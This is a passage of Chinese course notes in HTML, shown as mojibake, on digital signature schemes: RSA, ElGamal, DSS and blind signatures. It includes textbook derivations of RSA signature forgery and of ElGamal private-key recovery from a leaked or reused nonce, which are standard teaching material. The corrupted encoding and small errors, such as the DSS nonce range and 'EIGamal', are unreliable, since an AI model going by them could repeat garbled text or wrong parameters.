ç»Ÿç­¾åçš„æ•°å­—åŒ–ï¼Œè¦æ±‚ï¼š"></a>æ•°å­—ç­¾åæ˜¯ä¼ ç»Ÿç­¾åçš„æ•°å­—åŒ–ï¼Œè¦æ±‚ï¼š</h4><ul><li>èƒ½ä¸æ‰€ç­¾æ–‡ä»¶ <em>ç»‘å®š</em></li><li>ç­¾åè€… <em>ä¸èƒ½å¦è®¤</em> è‡ªå·±çš„ç­¾å</li><li>ç­¾å <em>ä¸èƒ½è¢«ä¼ªé€ </em></li><li>å®¹æ˜“ <em>è¢«è‡ªåŠ¨</em> éªŒè¯</li></ul><h4 id="æ•°å­—ç­¾ååº”å…·æœ‰çš„ç‰¹æ€§"><a href="#æ•°å­—ç­¾ååº”å…·æœ‰çš„ç‰¹æ€§" class="headerlink" title="æ•°å­—ç­¾ååº”å…·æœ‰çš„ç‰¹æ€§"></a>æ•°å­—ç­¾ååº”å…·æœ‰çš„ç‰¹æ€§</h4><p>ï¼ˆ1ï¼‰ ç­¾åæ˜¯å¯ä¿¡çš„ï¼šä»»ä½•äººå¯éªŒè¯å‰é¢çš„æœ‰æ•ˆæ€§</p><p>ï¼ˆ2ï¼‰ ç­¾åæ˜¯ä¸å¯ä¼ªé€ çš„ï¼šé™¤åˆæ³•ç­¾åè€…å¤–ï¼Œå…¶ä»–äººä¼ªé€ ç­¾åæ˜¯å›°éš¾çš„</p><p>ï¼ˆ3ï¼‰ ç­¾åæ˜¯ä¸å¯å¤åˆ¶çš„ï¼š ä¸€æ¶ˆæ¯çš„ç­¾åä¸èƒ½å¤åˆ¶ä¸ºå¦ä¸€æ¶ˆæ¯çš„ç­¾å</p><p>ï¼ˆ4ï¼‰ ç­¾åçš„æ¶ˆæ¯æ˜¯ä¸å¯æ”¹å˜çš„ï¼šç»ç­¾åçš„æ¶ˆæ¯ä¸èƒ½è¢«ç¯¡æ”¹</p><p>ï¼ˆ5ï¼‰ ç­¾åæ˜¯ä¸å¯æŠµèµ–çš„ï¼š ç­¾åè€…äº‹åä¸èƒ½å¦è®¤è‡ªå·±çš„ç­¾å</p><p><em>æ•°å­—ç­¾åï¼š å¯¹èº«ä»½è®¤è¯ï¼Œä¿æŒæ•°æ®å®Œæ•´æ€§ï¼Œä¸å¯å¦è®¤æ€§</em></p><p><em>MACï¼š å¯å¯¹èº«ä»½è®¤è¯ï¼Œä¿æŒæ•°æ®å®Œæ•´æ€§ï¼Œä½†ä¸å…·æœ‰ä¸å¯å¦è®¤æ€§</em></p><h2 id="æ•°å­—ç­¾åçš„æ„æˆ"><a href="#æ•°å­—ç­¾åçš„æ„æˆ" class="headerlink" title="æ•°å­—ç­¾åçš„æ„æˆ"></a>æ•°å­—ç­¾åçš„æ„æˆ</h2><h3 id="æ•°å­—ç­¾åæ–¹æ¡ˆçš„æ„æˆ"><a href="#æ•°å­—ç­¾åæ–¹æ¡ˆçš„æ„æˆ" class="headerlink" title="æ•°å­—ç­¾åæ–¹æ¡ˆçš„æ„æˆ"></a>æ•°å­—ç­¾åæ–¹æ¡ˆçš„æ„æˆ</h3><p>ä¸€ä¸ªæ•°å­—ç­¾åæ–¹æ¡ˆåŒ…æ‹¬å¦‚ä¸‹ä¸‰ä¸ªç®—æ³•ï¼š</p><ul><li>å¯†é’¥ç”Ÿæˆï¼šäº§ç”Ÿç”¨æˆ·çš„å…¬ç§é’¥</li><li>ç­¾åç®—æ³•ï¼šäº§ç”Ÿæ¶ˆæ¯çš„ç­¾å</li><li>éªŒè¯ç®—æ³•ï¼šéªŒæ”¶æ¶ˆæ¯çš„ç­¾åæ˜¯å¦åˆæ³•</li></ul><h2 id="æ•°å­—ç­¾åçš„éœ€æ±‚"><a href="#æ•°å­—ç­¾åçš„éœ€æ±‚" class="headerlink" title="æ•°å­—ç­¾åçš„éœ€æ±‚"></a>æ•°å­—ç­¾åçš„éœ€æ±‚</h2><h3 id="éœ€æ»¡è¶³æ¡ä»¶"><a href="#éœ€æ»¡è¶³æ¡ä»¶" class="headerlink" title="éœ€æ»¡è¶³æ¡ä»¶"></a>éœ€æ»¡è¶³æ¡ä»¶</h3><ul><li>å¿…é¡»ç›¸å¯¹å®¹æ˜“ç”Ÿæˆè¯¥æ•°å­—ç­¾å</li><li>å¿…é¡»ç›¸å¯¹å®¹æ˜“è¯†åˆ«å’ŒéªŒè¯è¯¥æ•°å­—ç­¾å</li><li><em>ä¼ªé€ </em> è¯¥æ•°å­—ç­¾ååœ¨ <em>è®¡ç®—ä¸Šä¸å¯è¡Œ</em> ï¼Œæ—¢åŒ…æ‹¬å¯¹ä¸€ä¸ªå·²æœ‰çš„æ•°å­—ç­¾åæ„é€ æ–°çš„æ¶ˆæ¯ï¼Œä¹ŸåŒ…æ‹¬å¯¹ä¸€ä¸ªæ¶ˆæ¯ä¼ªé€ ä¸€ä¸ªæ•°å­—ç­¾å</li></ul><h3 id="RSAç­¾åç®—æ³•"><a href="#RSAç­¾åç®—æ³•" class="headerlink" title="RSAç­¾åç®—æ³•"></a>RSAç­¾åç®—æ³•</h3><h4 id="RSAç­¾åä½“åˆ¶"><a href="#RSAç­¾åä½“åˆ¶" class="headerlink" title="RSAç­¾åä½“åˆ¶"></a>RSAç­¾åä½“åˆ¶</h4><ul><li>ä½“åˆ¶å‚æ•°<ul><li>é€‰ä¸¤ä¸ªä¿å¯†çš„å¤§ç´ æ•° p å’Œ qï¼Œè®¡ç®— $n &#x3D; p*q$ , $\varphi(n) &#x3D; (p-1)\cdot(q-1)$ï¼›</li><li>é€‰ä¸€æ•´æ•°eï¼Œæ»¡è¶³ $ 1&lt;e&lt;\varphi(n)$,ä¸” $gcd(\varphi(n),e) &#x3D; 1$</li><li>è®¡ç®— dï¼Œæ»¡è¶³ $d \cdot e \equiv 1 \bmod \varphi(n)$;</li><li>ä»¥ $\lbrace e,n \rbrace$ ä¸ºå…¬é’¥ï¼Œ$\lbrace d,n \rbrace$ ä¸ºç§é’¥</li></ul></li></ul><h4 id="RSAå…¬é’¥åŠ å¯†ä½“åˆ¶åŸç†"><a href="#RSAå…¬é’¥åŠ å¯†ä½“åˆ¶åŸç†" class="headerlink" title="RSAå…¬é’¥åŠ å¯†ä½“åˆ¶åŸç†"></a>RSAå…¬é’¥åŠ å¯†ä½“åˆ¶åŸç†</h4><ul><li><p>å¯†é’¥ç”Ÿæˆ</p><ul><li>é€‰æ‹©ä¸¤ä¸ªå¤§ç´ æ•° <em>p</em> å’Œ <em>q</em></li><li>è®¡ç®— $ n &#x3D; p \cdot q , \varphi &#x3D; (p-1) \cdot (q-1)$</li><li>éšæœºé€‰å–<em>e</em>ï¼Œè¦æ±‚$ e &lt; n $ï¼Œ<em>e</em> ä¸ $ \varphi $ æ²¡æœ‰å…¬å› æ•°ï¼Œå³ <em>e</em> ä¸ $ \varphi $ äº’è´¨</li><li>é€‰å– <em>d</em> ä½¿å¾— $ ed  \equiv 1 \bmod \varphi(n) $</li><li>å…¬é’¥æ˜¯ $ (n,e) $ï¼Œç§é’¥æ˜¯ $ (n,d) $</li></ul></li><li><p>ç­¾å</p><p>è®¾æ¶ˆæ¯ä¸º $ m \in Z_n $ï¼Œå¯¹å…¶ç­¾åä¸º $$ S \equiv m^d \bmod n $$</p><p><em>S å³ä¸ºç­¾å</em></p></li><li><p>éªŒè¯</p><p>æ¥æ”¶æ–¹åœ¨æ”¶åˆ°æ¶ˆæ¯ <em>m</em> å’Œç­¾å <em>s</em> åï¼ŒéªŒè¯ $$ m \equiv s^e \bmod n $$ æ˜¯å¦æˆç«‹ï¼Œè‹¥æˆç«‹ï¼Œåˆ™å‘é€æ–¹çš„ç­¾åæœ‰æ•ˆ</p></li><li><p>å®‰å…¨æ€§ï¼š å¤§æ•°åˆ†è§£çš„å›°éš¾æ€§</p><ul><li>å¦‚æœRSAçš„æ¨¡æ•° <em>n</em> è¢«æˆåŠŸåˆ†è§£ä¸º $p*q$ï¼Œåˆ™ç«‹å³è·å¾— $\varphi(n) &#x3D; (p-1) \cdot (q-1) $</li><li>ä»è€Œèƒ½å¤Ÿç¡®å®š <em>e</em> æ¨¡ $ \varphi(n) $ çš„ä¹˜æ³•é€†å…ƒ <em>d</em> ï¼Œ</li><li>å› æ­¤æ”»å‡»æˆåŠŸ</li></ul></li><li><p>æ­£ç¡®æ€§ï¼š</p><ul><li>å› ä¸º $ d \cdot e \equiv 1 \bmod \varphi (n) $</li><li>æ‰€ä»¥ $ s^e \equiv m^{d \cdot e} \equiv m^{1 + k \cdot \varphi (n)} \equiv m^1 \cdot m^{k \cdot \varphi (n)} \equiv m \bmod n $ </li><li>å…¶ä¸­ k ä¸ºæŸä¸ªæ•´æ•°</li></ul></li></ul><h4 id="ç¼ºç‚¹"><a href="#ç¼ºç‚¹" class="headerlink" title="ç¼ºç‚¹"></a>ç¼ºç‚¹</h4><p>$$ m \equiv S^e \bmod n $$</p><p>ï¼ˆ1ï¼‰ å¯¹ä»»æ„æ¶ˆæ¯ $ y \in Z_n $ ,ä»»ä½•äººå¯ä»¥è®¡ç®— $ x \equiv y^e \bmod n $,å› æ­¤ä»»ä½•äººå¯ä»¥ä¼ªé€ å¯¹éšæœºæ¶ˆæ¯ <em>x</em> çš„ç­¾å</p><p>ï¼ˆ2ï¼‰ å¦‚æœæ¶ˆæ¯ $x_1$ å’Œ $x_2$ çš„ç­¾ååˆ†åˆ«æ˜¯ $y_1$ å’Œ $ y_2$ ï¼Œåˆ™çŸ¥é“ $x_1,x_2,y_1,y_2$çš„äººå¯ä»¥ä¼ªé€ æ¶ˆæ¯ $x_1 \cdot x_2$çš„ç­¾å$y_1 \cdot y_2 $çš„ç­¾å </p><p>ï¼ˆ3ï¼‰ åœ¨RSAç­¾åæ–¹æ¡ˆä¸­ï¼Œéœ€ç­¾åçš„æ¶ˆæ¯ $ x \in Z_n $ï¼Œæ‰€ä»¥æ¯æ¬¡åªèƒ½å¯¹ $ \lfloor \log_2n \rfloor $ä½é•¿æ¶ˆæ¯ç­¾åï¼Œ<em>ç­¾åé€Ÿåº¦æ…¢</em></p><p><em>å…‹æœç¼ºé™·çš„æ–¹æ³•ï¼šç­¾åä¹‹å‰å…ˆæ±‚æ¶ˆæ¯çš„Hashå€¼</em></p><h3 id="EIGamal-ç­¾åç®—æ³•"><a href="#EIGamal-ç­¾åç®—æ³•" class="headerlink" title="EIGamal ç­¾åç®—æ³•"></a>EIGamal ç­¾åç®—æ³•</h3><ul><li>1985å¹´ EIGamal æå‡ºäº†ä¸€ä¸ªåŸºäºç¦»æ•£å¯¹æ•°é—®é¢˜çš„ç­¾åæ–¹æ¡ˆï¼Œåæ¥ç§°ä¸º EIGamal æ•°å­—ç­¾åæ–¹æ¡ˆ</li><li>1991å¹´è¯¥æ•°å­—ç­¾åæ–¹æ¡ˆçš„å˜å½¢è¢«ç¾å›½å›½å®¶æ ‡å‡†å±€ï¼ˆNISTï¼‰ç¡®å®šä½æ•°å­—ç­¾åæ ‡å‡†ï¼ˆDSSï¼‰</li></ul><h4 id="EIGamalç­¾åä½“åˆ¶"><a href="#EIGamalç­¾åä½“åˆ¶" class="headerlink" title="EIGamalç­¾åä½“åˆ¶"></a>EIGamalç­¾åä½“åˆ¶</h4><ul><li>ä½“åˆ¶å‚æ•°<ul><li>pï¼šå¤§ç´ æ•°</li><li>gï¼š$Z^*_p $çš„ä¸€ä¸ªç”Ÿæˆå…ƒ</li><li>xï¼šç”¨æˆ·Açš„å¯†é’¥ï¼Œ$x \in Z^*_p$</li><li>yï¼šç”¨æˆ·Açš„å…¬é’¥ï¼Œ$y \equiv g^x(\bmod p)$</li><li>K:  éšæœºæ•°ï¼Œç”¨äºè®¡ç®— $r &#x3D; g^k \bmod p$, $r$ æ˜¯ç­¾åä¹‹ä¸€</li></ul></li><li>å‚æ•°è¦æ±‚ï¼š<ul><li><em>P</em> åº”ä¸º150ä½ä»¥ä¸Šçš„åè¿›åˆ¶æ•°ï¼Œ500ä½ä»¥ä¸Šçš„äºŒè¿›åˆ¶æ•°ï¼Œ<em>p-1</em> åº”æœ‰å¤§ç´ æ•°å› å­</li><li><em>K</em> å¿…é¡»æ˜¯ä¿å¯†è€Œä¸”å¿…é¡»æ˜¯ä¸€æ¬¡æ€§çš„<ul><li><em>K</em> æ³„éœ²ï¼Œåˆ™æ•Œæ‰‹å¯ä»¥è®¡ç®— $ y^K $ä»è€Œå¯ä»¥è®¡ç®—å‡º <em>M</em></li><li>ä½¿ç”¨åŒä¸€ <em>K</em> åŠ å¯†ä¸åŒçš„æ˜æ–‡ <em>M</em> ï¼Œ<em>Mâ€™</em> ï¼Œå¦‚æœæ•Œæ‰‹çŸ¥é“ <em>M</em> å°±å¯ä»¥ç”± $ C_2 &#x2F; C_2^{â€˜} &#x3D; M &#x2F; M^{â€˜}$æ±‚å‡º<em>Mâ€˜</em></li></ul></li></ul></li></ul><h4 id="EIGamalå…¬é’¥åŠ å¯†ä½“åˆ¶åŸç†"><a href="#EIGamalå…¬é’¥åŠ å¯†ä½“åˆ¶åŸç†" class="headerlink" title="EIGamalå…¬é’¥åŠ å¯†ä½“åˆ¶åŸç†"></a>EIGamalå…¬é’¥åŠ å¯†ä½“åˆ¶åŸç†</h4><ul><li><p>å¯†é’¥ç”Ÿæˆ</p><ul><li>é€‰å–å¤§ç´ æ•° <em>p</em> ï¼Œ$g \in Z^*_n $ æ˜¯ä¸€ä¸ªç”Ÿæˆå…ƒï¼Œ <em>p</em> å’Œ <em>g</em> å…¬å¼€</li><li>éšæœºé€‰æ•´æ•° $ x, 1 \leq x \leq p-2 $,è®¡ç®— $ y &#x3D; g^x \bmod p $</li><li>å…¬é’¥ä¸º <em>y</em> ï¼Œç§é’¥ä¸º <em>x</em></li></ul></li><li><p>ç­¾å</p><p>å¯¹äºæ¶ˆæ¯ <em>m</em> ï¼Œé¦–å…ˆéšæœºé€‰å–æ•´æ•° <em>k</em> ï¼Œ$ 1 \leq k \leq p-2 $,ç„¶åè®¡ç®— </p><p>$$ r &#x3D; g^k \bmod p, s &#x3D; (h(m) -x \cdot r) \cdot k^{-1} \bmod (p-1) $$</p><p>åˆ™ <em>m</em> çš„ç­¾åä¸º $(r,s)$,å…¶ä¸­ <em>h</em> ä¸º <em>Hash</em>å‡½æ•°</p></li><li><p>éªŒè¯</p><p>æ¥æ”¶æ–¹åœ¨æ”¶åˆ°æ¶ˆæ¯ <em>m</em>  å’Œ ç­¾å $(r,s)$ åï¼ŒéªŒè¯</p><p>$$ y^r \cdot r^s &#x3D; g^{h(m)} \bmod p$$</p><p>å¦‚æœç­‰å¼æˆç«‹ ï¼Œåˆ™ $(r,s)$ æ˜¯æ¶ˆæ¯ <em>m</em> çš„æœ‰æ•ˆç­¾åï¼Œåä¹‹æ— æ•ˆ</p></li><li><p>æ­£ç¡®æ€§</p><ul><li><p>å› ä¸º $ s &#x3D; (h(m) - x \cdot r) \cdot k^{-1} \bmod (p-1)$</p></li><li><p>æ‰€ä»¥ $ s \cdot k + x \cdot r &#x3D; h(m) \bmod (p-1)$</p></li><li><p>æ‰€ä»¥  $ g^{h(m)} &#x3D; g^{(s \cdot k + x \cdot r)} &#x3D; g^{sk} \cdot g^{xr} &#x3D; y^r \cdot r^s \bmod p$</p></li><li><p>note: $y &#x3D; g^x \bmod p$ ,  $r &#x3D; g^k \bmod p$</p><p>â€‹  å¦‚æœæ¶ˆæ¯ <em>m</em> è¢«ç¯¡æ”¹ï¼Œåˆ™ <em>h(m)</em> å‘ç”Ÿæ”¹å˜ï¼Œä»è€Œ $y^r \cdot r^s \neq g^{h(m)} $ èµ·åˆ°éªŒè¯ä½œç”¨</p></li></ul></li></ul><h4 id="è®¨è®ºä¸¤é—®é¢˜"><a href="#è®¨è®ºä¸¤é—®é¢˜" class="headerlink" title="è®¨è®ºä¸¤é—®é¢˜"></a>è®¨è®ºä¸¤é—®é¢˜</h4><p>  ï¼ˆ1ï¼‰ ç”¨EIGamalæ–¹æ¡ˆè®¡ç®—ä¸€ä¸ªç­¾åæ—¶ï¼Œä½¿ç”¨çš„éšæœºæ•° <em>K</em> èƒ½ä¸èƒ½è¢«æ³„éœ²</p><p>  ï¼ˆ2ï¼‰ è‹¥Bobä½¿ç”¨ç›¸åŒçš„ <em>K</em> çš„å€¼æ¥ç­¾åä¸åŒçš„ä¸¤ä»½æ¶ˆæ¯ï¼Œ Oscarèƒ½å¦æ”»ç ´è¿™ä¸ªä½“åˆ¶</p><p>Answer1:</p><ul><li>ç”±äºç§é’¥ <em>x</em> æ˜¯ä¿å¯†çš„ï¼Œæ‰€ä»¥å¦‚æœæ”»å‡»è€…æƒ³è¦å¾—åˆ°è¿™ä¸ªå¯†é’¥ï¼Œå¿…é¡»æ±‚è§£ç¦»æ•£å¯¹æ•°é—®é¢˜ $\log_gy$ ,è¿™æ˜¯ä¸€ä¸ªå›°éš¾é—®é¢˜ã€‚ä½†æ˜¯éšæœºæ•° <em>K</em> æ³„éœ²ï¼Œåˆ™å¯è§£ $ x &#x3D; (h(m) - sk)r^{-1} \bmod (p-1)$ å¾—åˆ° <em>x</em>ï¼Œæ–¹æ¡ˆè¢«æ”»ç ´</li><li>noteï¼šä¸ºä»€ä¹ˆ <em>K</em> æ³„éœ²æ–¹æ¡ˆä¼šè¢«æ”»ç ´å‘¢<ul><li>å…ˆçœ‹çœ‹å…¬å¼€å‚æ•°æœ‰ä»€ä¹ˆ <ul><li>å¤§ç´ æ•° <em>P</em></li><li>ç”Ÿæˆå…ƒ <em>g</em></li><li>å…¬é’¥ <em>y</em> ï¼Œ<em>y</em> ç”± $ y&#x3D; g^x \bmod p$ å¾—åˆ°</li><li>ç­¾åä¸€ <em>r</em> ï¼Œ<em>r</em> ç”± $r&#x3D;g^k \bmod p$ å¾—åˆ°</li><li>ç­¾åäºŒ <em>s</em> , <em>s</em> ç”± $s &#x3D; (h(m) -x \cdot r) \cdot k^{-1} \bmod (p-1)$ å¾—åˆ°</li></ul></li><li>ç°åœ¨å‡è®¾æˆ‘ä»¬æ˜¯ä¸­é—´äººï¼Œæˆ‘ä»¬å¯ä»¥è·å¾—è¿™äº›æ¶ˆæ¯ï¼Œå¹¶æƒ³ç¯¡æ”¹æ¶ˆæ¯ <em>m</em>ï¼Œä½†æ˜¯ä¸€æ—¦ç¯¡æ”¹æ¶ˆæ¯ <em>m</em>ï¼Œä¼šå¯¼è‡´ <em>h(m)</em> å‘ç”Ÿæ”¹å˜ï¼Œä»è€Œå¯¼è‡´ $$y^r \cdot r^s \neq g^{h(m)} $$ ï¼Œæ¥æ”¶è€…å°±çŸ¥é“æ¶ˆæ¯å·²è¢«ç¯¡æ”¹ã€‚å› æ­¤æƒ³è¦ä¸è¢«å‘ç°ï¼Œå¿…é¡»è¿å¸¦ç€æŠŠ <em>r</em> ,<em>s</em> ä¹Ÿä¸€èµ·æ”¹å˜ï¼Œå³é‡æ–°è®¡ç®—  $$s &#x3D; (h(m) -x \cdot r) \cdot k^{-1} \bmod (p-1) $$ ï¼Œå¾—åˆ° $sâ€™$ ,å¹¶å‘é€ç¯¡æ”¹åçš„ç­¾å $(r,sâ€™)$ï¼Œè¿™æ ·æ¥æ”¶æ–¹å°±æ— æ³•åˆ¤æ–­æ¶ˆæ¯æ˜¯å¦è¢«ç¯¡æ”¹</li><li>æ‰€ä»¥ç°åœ¨çš„é—®é¢˜æ˜¯ï¼Œå¦‚ä½•è®¡ç®— $sâ€™$ ? çœ‹çœ‹ <em>s</em> çš„ç”Ÿæˆå¼ï¼Œæˆ‘ä»¬å¿…é¡»çŸ¥é“ <em>x</em> å’Œ <em>k</em> æ‰èƒ½è®¡ç®— <em>s</em> </li><li>æˆ‘ä»¬æ‰‹ä¸Šç°åœ¨è·Ÿ <em>K</em> ç›¸å…³çš„å¼å­åªæœ‰ä¸¤æ¡ $r&#x3D;g^k \bmod p$ å’Œ $s &#x3D; (h(m) -x \cdot r) \cdot k^{-1} \bmod (p-1)$ ï¼Œæ˜¾ç„¶æˆ‘ä»¬åº”è¯¥ç”¨å‰é¢é‚£ä¸€æ¡å¼å­ï¼Œå› ä¸ºåé¢çš„å¼å­æœ‰ä¸¤ä¸ªæœªçŸ¥æ•°</li><li>é‚£å°±æ¥çœ‹çœ‹ç¬¬ä¸€ä¸ªå¼å­å§ï¼Œ æˆ‘ä»¬ç°åœ¨çŸ¥é“ $r, g, p$ï¼Œéœ€è¦æ±‚ <em>g</em> çš„å‡ æ¬¡æ–¹æ¨¡ <em>p</em> ç­‰äº <em>r</em> ï¼Œç„¶è€Œè¿™æ˜¯ä¸ªå¾ˆå›°éš¾çš„é—®é¢˜ï¼Œä¹Ÿå°±æ˜¯ç¦»æ•£å¯¹æ•°é—®é¢˜ï¼ŒEIGamalçš„å®‰å…¨æ€§å°±åŸºäºæ­¤ã€‚</li><li>ä¸€æ—¦ <em>K</em> æ³„éœ²ï¼Œå°±å¯ä»¥è®¡ç®—å‡º <em>x</em> ï¼Œæ•´ä¸ªæ¶ˆæ¯å°±å¯ä»¥è¢«ç¯¡æ”¹å¹¶è¿›è¡Œé‡æ–°ç­¾åå¾—åˆ° $sâ€™$</li></ul></li></ul><p>Answer2:</p><ul><li><p>ä¸å¯ç”¨åŒä¸€ä¸ª <em>K</em> åšä¸¤æ¬¡ç­¾åã€‚è‹¥Bobåˆ©ç”¨ç›¸åŒ <em>K</em> ç­¾åä¸¤æ¬¡ï¼Œå³ç­¾ååˆ†åˆ«ä¸º $(r,s_1)$ ,$(r,s_2)$ ,åˆ™Oscarå¯ä»¥è”ç«‹æ–¹ç¨‹ </p><p>$$<br>\begin{cases}<br>h(m1) &#x3D; xr +ks_1 \bmod (p-1) \newline h(m2) &#x3D; xr +ks_2 \bmod (p-1)<br>\end{cases}<br>$$</p><p>å¯å¾—ï¼š $ x &#x3D; [h(m_1)s_2 - h(m_2)s_1] (s_2 - s_1) ^{-1} r^{-1} \bmod (p-1) $</p></li><li><p>noteï¼š ä¸Šå¼ä¹˜ $s_2$, ä¸‹å¼ä¹˜ $s_1$ å³å¯</p></li></ul><p>â€‹  </p><h3 id="DSSç­¾åç®—æ³•"><a href="#DSSç­¾åç®—æ³•" class="headerlink" title="DSSç­¾åç®—æ³•"></a>DSSç­¾åç®—æ³•</h3><p>æ•°å­—ç­¾åæ ‡å‡†DSS(Digital Signature Standard)æ˜¯ç”±ç¾å›½NISTå…¬å¸ƒçš„è”é‚¦ä¿¡æ¯å¤„ç†æ ‡å‡†FIPS PUB 186ï¼Œæœ€åˆäº1991å¹´å…¬å¸ƒï¼Œåœ¨è€ƒè™‘äº†å…¬ä¼—å½’é˜Ÿå…¶å®‰å…¨æ€§çš„åé¦ˆæ„è§åï¼Œäº1993å¹´å…¬å¸ƒäº†å…¶ä¿®æ”¹ç‰ˆ</p><ul><li><p>DSSçš„åŸºæœ¬æ–¹å¼</p><p>é¦–å…ˆå°†DSSä¸RSAçš„ç­¾åæ–¹å¼åšä¸€æ¯”è¾ƒã€‚RSAç®—æ³•æ—¢èƒ½ç”¨äºåŠ å¯†å’Œç­¾åï¼Œåˆèƒ½ç”¨äºå¯†é’¥äº¤æ¢ã€‚ä¸æ­¤ä¸åŒï¼ŒDSSä½¿ç”¨çš„ç®—æ³•åªèƒ½æä¾›æ•°å­—ç­¾ååŠŸèƒ½ã€‚ä¸‹å›¾æ˜¯æ¯”è¾ƒ</p></li></ul><p><img src="https://yring-me.oss-cn-beijing.aliyuncs.com/test/202305311621956.png" alt="1"></p><h4 id="å¯†é’¥ç”Ÿæˆ"><a href="#å¯†é’¥ç”Ÿæˆ" class="headerlink" title="å¯†é’¥ç”Ÿæˆ"></a>å¯†é’¥ç”Ÿæˆ</h4><ul><li><p>è®¾ $512 \leq L \leq 1024$ ä¸” $L$ æ˜¯64çš„å€æ•°ï¼Œé€‰å– $2^{L-1} &lt; p &lt;2^L$ å¤§ç´ æ•°ï¼Œå…¶æ»¡è¶³å­˜åœ¨160æ¯”ç‰¹çš„ç´ æ•°$q|p-1$</p></li><li><p>éšæœºé€‰å–æ•´æ•° $h$ ,$ 1 &lt; h &lt;p-1 $ ,ä¸”ä½¿ $ g &#x3D; h^{(p-1) &#x2F;q} \bmod p $ , $p,g$ å…¬å¼€ </p></li><li><p>éšæœºé€‰å–æ•´æ•° $x$ , $1 \leq x \leq q-1 $ , è®¡ç®— $ y &#x3D; g^x \bmod p $</p></li><li><p>å…¬é’¥ä¸º $y$, ç§é’¥ä¸º $x$</p></li></ul><h4 id="ç­¾å"><a href="#ç­¾å" class="headerlink" title="ç­¾å"></a>ç­¾å</h4><ul><li>å¯¹äºæ¶ˆæ¯ <em>m</em> ï¼Œé¦–å…ˆéšæœºé€‰å–ä¸€ä¸ªæ•´æ•° <em>k</em>ï¼Œ$1 \leq k \leq p-2 $ ,ç„¶åè®¡ç®—<br>$$ {left}<br>\begin{align}<br>&amp;r &#x3D; (g^k \bmod p ) \bmod q \<br>&amp;s &#x3D; (h(m) + xr) K^{-1} \bmod q<br>\end{align}<br>$$<br>åˆ™ <em>m</em> çš„ç­¾åä¸º $(r,s$) ,å…¶ä¸­ <em>h</em> ä¸ºHashå‡½æ•°SHA</li></ul><h4 id="éªŒè¯"><a href="#éªŒè¯" class="headerlink" title="éªŒè¯"></a>éªŒè¯</h4><ul><li><p>æ¥æ”¶æ–¹æ”¶åˆ°æ¶ˆæ¯ <em>m</em> å’Œ ç­¾å $(r,s$)ï¼Œåè®¡ç®—<br>$$<br>\begin{align}<br>u_1 &amp;&#x3D; h(m) s^{-1} \bmod q \newline<br>u_2 &amp;&#x3D; rs^{-1} \bmod q<br>\end{align}<br>$$</p></li><li><p>éªŒè¯ç­‰å¼<br>$$<br>(g^{u_1}y^{u_2} \bmod p) \bmod q &#x3D;r<br>$$</p></li><li><p>å¦‚æœç­‰å¼æˆç«‹ï¼Œåˆ™$(r,s)$ æ¶ˆæ¯ <em>m</em> çš„æœ‰æ•ˆç­¾å</p></li></ul><h4 id="æ­£ç¡®æ€§"><a href="#æ­£ç¡®æ€§" class="headerlink" title="æ­£ç¡®æ€§"></a>æ­£ç¡®æ€§</h4><ul><li><p>å› ä¸º $u_1 + xu_2 \bmod q &#x3D; (h(m) + xr)s^{-1} \bmod q &#x3D; k$</p></li><li><p>æ‰€ä»¥<br>$$<br>\begin{align}<br>g^{u_1}y^{u_2} \bmod p \bmod q &amp;&#x3D; g^{u_1+ xu_2} \bmod p \bmod q \newline<br>&amp;&#x3D; g^k \bmod p \bmod q \newline<br>&amp;&#x3D;r<br>\end{align}<br>$$</p></li></ul><h2 id="ç‰¹æ®Šæ€§è´¨çš„ç­¾åç®—æ³•"><a href="#ç‰¹æ®Šæ€§è´¨çš„ç­¾åç®—æ³•" class="headerlink" title="ç‰¹æ®Šæ€§è´¨çš„ç­¾åç®—æ³•"></a>ç‰¹æ®Šæ€§è´¨çš„ç­¾åç®—æ³•</h2><h3 id="ç›²ç­¾å"><a href="#ç›²ç­¾å" class="headerlink" title="ç›²ç­¾å"></a>ç›²ç­¾å</h3><h4 id="æ¦‚å¿µ"><a href="#æ¦‚å¿µ" class="headerlink" title="æ¦‚å¿µ"></a>æ¦‚å¿µ</h4><ul><li>ç›²ç­¾åæ–¹æ¡ˆæ˜¯åœ¨å‘é€è€… <em>A</em> å’Œå‘é€è€… <em>B</em> ä¹‹é—´çš„åŒæ–¹åè®®ã€‚å…¶åŸºæœ¬æ€æƒ³å¦‚ä¸‹ï¼š<ul><li><em>A</em> å‘é€ç»™ <em>B</em> ä¸€æ®µæ¶ˆæ¯ï¼Œ<em>B</em> å¯¹å®ƒç­¾åå¹¶é€å› <em>A</em> </li><li>ä»è¿™ä¸ªç­¾å <em>A</em> èƒ½å¤Ÿè®¡ç®— <em>B</em> å…³äº <em>A</em> é¢„å…ˆæ‰€é€‰æ¶ˆæ¯ <em>m</em> çš„ç­¾å</li><li>åè®®å®Œæˆæ—¶ <em>B</em> æ—¢ä¸çŸ¥é“æ¶ˆæ¯ <em>m</em> ä¹Ÿä¸çŸ¥é“æ¶ˆæ¯çš„ç­¾å</li></ul></li><li>ç›²ç­¾åçš„ç›®çš„æ˜¯é˜²æ­¢ <em>B</em> çœ‹åˆ°æ¶ˆæ¯å’Œç­¾åï¼Œä»è€Œä½¿ <em>B</em> ä»¥åä¸èƒ½å°†æ‰€ç­¾æ¶ˆæ¯å’Œå‘é€è€… <em>A</em> è”ç³»èµ·æ¥</li></ul><h4 id="åº”ç”¨"><a href="#åº”ç”¨" class="headerlink" title="åº”ç”¨"></a>åº”ç”¨</h4><ul><li>å‘é€è€… <em>A</em>ï¼ˆå®¢æˆ·ï¼‰ä¸å¸Œæœ›ç­¾åè€… <em>B</em>ï¼ˆé“¶è¡Œï¼‰èƒ½å¤Ÿå°†ä¸€æ¡å…ˆéªŒæ¶ˆæ¯ <em>m</em> åŠå…¶ç­¾å $S_B(m)$ ä¸åè®®çš„ç‰¹å®šå®ä¾‹ç›¸è”ç³»</li><li>è¿™ä¸ªç‰¹æ€§åœ¨ç”µå­ç°é‡‘åº”ç”¨ä¸­å¯èƒ½å¾ˆé‡è¦ï¼Œå› ä¸ºé‚£é‡Œçš„æ¶ˆæ¯ä¹Ÿè®¸è¡¨ç¤º <em>A</em> æ‰€èŠ±çš„é‡‘é’±æ•°é¢</li><li>å½“ <em>m</em> å’Œ $S_B(m)$ æäº¤ç»™ <em>B</em> è¿›è¡Œæ”¯ä»˜æ—¶ï¼Œ <em>B</em> æ— æ³•æ¨æ–­åŸå…ˆæ¥æ”¶ç­¾åçš„æ˜¯è°ã€‚è¿™å°±æ˜¯å…è®¸ <em>A</em> çš„åŒ¿åæ€§ï¼Œä»è€Œ <em>A</em> 